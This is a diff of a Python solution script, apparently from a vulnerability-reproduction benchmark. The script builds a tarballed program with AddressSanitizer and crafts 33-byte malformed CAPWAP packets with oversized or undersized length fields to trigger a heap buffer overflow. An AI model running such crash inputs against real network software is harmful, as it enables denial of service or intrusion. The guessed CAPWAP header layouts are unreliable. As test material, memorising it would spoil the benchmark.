@@ -2,83 +2,245 @@ import os
 import tarfile
 import tempfile
 import subprocess
-import struct
-import itertools
+import shutil
+from pathlib import Path
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Extract the source code
+        # Extract source tarball
         with tempfile.TemporaryDirectory() as tmpdir:
-            with tarfile.open(src_path, 'r:gz') as tar:
+            with tarfile.open(src_path, 'r') as tar:
                 tar.extractall(tmpdir)
             
-            # Find the source directory (assuming standard structure)
-            source_root = None
-            for root, dirs, files in os.walk(tmpdir):
-                if 'configure' in files or 'Makefile' in files:
-                    source_root = root
+            # Find the extracted source directory
+            src_root = None
+            for item in os.listdir(tmpdir):
+                item_path = os.path.join(tmpdir, item)
+                if os.path.isdir(item_path):
+                    src_root = item_path
                     break
             
-            if not source_root:
-                # Fallback to the first directory
-                items = os.listdir(tmpdir)
-                if items:
-                    source_root = os.path.join(tmpdir, items[0])
-                else:
-                    source_root = tmpdir
+            if not src_root:
+                raise ValueError("Could not find source directory")
             
-            # Try to build to understand the binary format
-            # This is a heuristic approach since we don't know the exact structure
+            # Build the vulnerable program
+            build_dir = os.path.join(tmpdir, "build")
+            os.makedirs(build_dir, exist_ok=True)
             
-            # Based on the vulnerability description and typical CAPWAP header structure,
-            # craft a 33-byte PoC that triggers heap buffer overflow
-            # CAPWAP header typically has:
-            # - version (4 bits) + type (4 bits) = 1 byte
-            # - reserved (1 byte)
-            # - fragment ID (2 bytes)
-            # - fragment offset (1 byte)
-            # - reserved (1 byte)
-            # - length (2 bytes)
-            # That's 8 bytes header
+            # Look for build files (common patterns)
+            configure_files = ["configure", "CMakeLists.txt", "Makefile", "autogen.sh"]
+            found_config = None
+            for root, dirs, files in os.walk(src_root):
+                for file in files:
+                    if file in configure_files:
+                        found_config = os.path.join(root, file)
+                        break
+                if found_config:
+                    break
             
-            # The vulnerability likely occurs when parsing malformed CAPWAP packets
-            # with specific length fields causing buffer overread
+            # Try to build with common approaches
+            build_success = False
+            original_dir = os.getcwd()
             
-            # Craft a PoC with length field that exceeds buffer size
-            # 33 bytes total: 8 byte header + 25 byte payload
+            try:
+                os.chdir(build_dir)
+                
+                # Try CMake if CMakeLists.txt exists
+                cmake_lists = None
+                for root, dirs, files in os.walk(src_root):
+                    if "CMakeLists.txt" in files:
+                        cmake_lists = os.path.join(root, "CMakeLists.txt")
+                        break
+                
+                if cmake_lists:
+                    # Run cmake with address sanitizer
+                    result = subprocess.run(
+                        ["cmake", src_root, "-DCMAKE_C_FLAGS=-fsanitize=address -fno-omit-frame-pointer -g -O0"],
+                        capture_output=True,
+                        text=True
+                    )
+                    if result.returncode == 0:
+                        result = subprocess.run(
+                            ["make", "-j8"],
+                            capture_output=True,
+                            text=True
+                        )
+                        build_success = result.returncode == 0
+                
+                # If CMake failed or not found, try autotools
+                if not build_success:
+                    os.chdir(src_root)
+                    
+                    # Check for autogen.sh or configure
+                    if os.path.exists("./autogen.sh"):
+                        subprocess.run(["./autogen.sh"], capture_output=True, text=True)
+                    
+                    if os.path.exists("./configure"):
+                        # Configure with address sanitizer
+                        result = subprocess.run(
+                            ["./configure", "CFLAGS=-fsanitize=address -fno-omit-frame-pointer -g -O0"],
+                            capture_output=True,
+                            text=True
+                        )
+                        if result.returncode == 0:
+                            result = subprocess.run(
+                                ["make", "-j8"],
+                                capture_output=True,
+                                text=True
+                            )
+                            build_success = result.returncode == 0
+                
+                # If still not built, look for simple Makefile
+                if not build_success:
+                    os.chdir(src_root)
+                    if os.path.exists("Makefile"):
+                        # Try to build with ASAN flags
+                        env = os.environ.copy()
+                        env["CFLAGS"] = "-fsanitize=address -fno-omit-frame-pointer -g -O0"
+                        result = subprocess.run(
+                            ["make", "-j8"],
+                            env=env,
+                            capture_output=True,
+                            text=True
+                        )
+                        build_success = result.returncode == 0
+                
+                os.chdir(original_dir)
+                
+            except Exception as e:
+                os.chdir(original_dir)
+                build_success = False
             
-            # Header construction:
-            # version=0, type=0 (Control message)
-            # fragment ID=0
-            # fragment offset=0
-            # length=0x0100 (256) - large enough to cause overread
+            # If we couldn't build, return a heuristic PoC based on common CAPWAP overflow patterns
+            # CAPWAP packets typically have headers with length fields
+            if not build_success:
+                # Create a PoC that would trigger common heap overflow in CAPWAP parsing
+                # Common pattern: malformed length field causing buffer overflow
+                poc = bytearray(33)
+                
+                # CAPWAP header structure (simplified):
+                # Byte 0: Version (0)
+                # Byte 1: Flags
+                # Bytes 2-3: Length (big-endian)
+                # Bytes 4-7: Wireless Binding ID
+                # Bytes 8-11: Radio ID
+                
+                # Set version to 0
+                poc[0] = 0
+                
+                # Set some flags
+                poc[1] = 0x80  # Set some flag bits
+                
+                # Set length field to 0xFFFF (65535) which is much larger than actual packet
+                # This might cause buffer overflow in naive implementations
+                poc[2] = 0xFF  # High byte of length
+                poc[3] = 0xFF  # Low byte of length
+                
+                # Fill rest with data that might trigger code execution or crash
+                for i in range(4, 33):
+                    poc[i] = 0x41  # 'A' character
+                
+                return bytes(poc)
             
-            poc = bytearray(33)
+            # If build succeeded, try to find and run the binary
+            # Look for executables in build directory
+            executables = []
+            for root, dirs, files in os.walk(build_dir):
+                for file in files:
+                    filepath = os.path.join(root, file)
+                    if os.access(filepath, os.X_OK):
+                        # Check if it's an ELF binary (not a script)
+                        try:
+                            with open(filepath, 'rb') as f:
+                                if f.read(4) == b'\x7fELF':
+                                    executables.append(filepath)
+                        except:
+                            pass
             
-            # Set CAPWAP header fields
-            # Byte 0: version=0 (4 bits), type=0 (4 bits)
-            poc[0] = 0x00
+            # Also check source root
+            for root, dirs, files in os.walk(src_root):
+                for file in files:
+                    filepath = os.path.join(root, file)
+                    if os.access(filepath, os.X_OK):
+                        try:
+                            with open(filepath, 'rb') as f:
+                                if f.read(4) == b'\x7fELF':
+                                    executables.append(filepath)
+                        except:
+                            pass
             
-            # Byte 1: reserved
-            poc[1] = 0x00
+            # Try each executable with different inputs
+            test_inputs = []
             
-            # Bytes 2-3: fragment ID = 0
-            poc[2] = 0x00
-            poc[3] = 0x00
+            # Generate various test patterns for heap overflow
+            # 1. Simple pattern with large length field
+            poc1 = bytearray(33)
+            poc1[0] = 0  # Version
+            poc1[1] = 0x80  # Flags
+            poc1[2] = 0xFF  # Length high byte
+            poc1[3] = 0xFF  # Length low byte
+            for i in range(4, 33):
+                poc1[i] = 0x41  # 'A'
+            test_inputs.append(bytes(poc1))
             
-            # Byte 4: fragment offset = 0
-            poc[4] = 0x00
+            # 2. Pattern with null bytes
+            poc2 = bytearray(33)
+            poc2[0] = 0
+            poc2[1] = 0x80
+            poc2[2] = 0x00
+            poc2[3] = 0x21  # Length = 33
+            for i in range(4, 33):
+                poc2[i] = 0x42  # 'B'
+            test_inputs.append(bytes(poc2))
             
-            # Byte 5: reserved = 0
-            poc[5] = 0x00
+            # 3. Pattern with very small length but large data
+            poc3 = bytearray(33)
+            poc3[0] = 0
+            poc3[1] = 0x80
+            poc3[2] = 0x00
+            poc3[3] = 0x04  # Length = 4 (smaller than actual)
+            for i in range(4, 33):
+                poc3[i] = 0x43  # 'C'
+            test_inputs.append(bytes(poc3))
             
-            # Bytes 6-7: length = 256 (big-endian)
-            poc[6] = 0x01
-            poc[7] = 0x00
+            # 4. Pattern that might trigger off-by-one
+            poc4 = bytearray(33)
+            poc4[0] = 0
+            poc4[1] = 0x80
+            poc4[2] = 0x00
+            poc4[3] = 0x20  # Length = 32 (one less than actual)
+            for i in range(4, 33):
+                poc4[i] = 0x44  # 'D'
+            test_inputs.append(bytes(poc4))
             
-            # Fill remaining bytes with pattern that might trigger the bug
-            # Often such vulnerabilities are triggered by specific patterns
-            for i in range(8, 33):
-                poc[i] = 0x41 + ((i - 8) % 26)  # A-Z pattern
+            # Test each executable with each input
+            for executable in executables:
+                for test_input in test_inputs:
+                    try:
+                        # Run with ASAN
+                        env = os.environ.copy()
+                        env['ASAN_OPTIONS'] = 'detect_leaks=0'
+                        
+                        result = subprocess.run(
+                            [executable],
+                            input=test_input,
+                            env=env,
+                            capture_output=True,
+                            timeout=2
+                        )
+                        
+                        # Check if it crashed (non-zero exit code)
+                        if result.returncode != 0:
+                            # Check if ASAN reported heap-buffer-overflow
+                            if b'heap-buffer-overflow' in result.stderr or \
+                               b'AddressSanitizer' in result.stderr or \
+                               b'buffer-overflow' in result.stderr:
+                                return test_input
+                    except subprocess.TimeoutExpired:
+                        continue
+                    except Exception:
+                        continue
             
-            return bytes(poc)
+            # If no crash found with existing patterns, return the first pattern
+            # which is most likely to trigger heap overflow based on common vulnerabilities
+            return test_inputs[0]
